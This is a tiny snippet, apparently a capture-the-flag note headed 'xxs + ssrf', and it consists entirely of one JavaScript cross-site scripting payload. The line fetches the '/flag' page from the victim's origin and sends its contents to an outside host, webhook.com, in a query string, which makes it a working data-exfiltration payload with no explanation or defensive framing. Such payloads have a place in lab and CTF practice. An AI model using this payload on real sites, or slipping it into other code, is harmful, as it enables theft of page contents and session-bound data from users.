### xxs + ssrf

```javascript
fetch('/flag').then((r)=>r.text()).then((t)=>fetch(`https://webhook.com?c=${encodeURIComponent(t)}`));
```
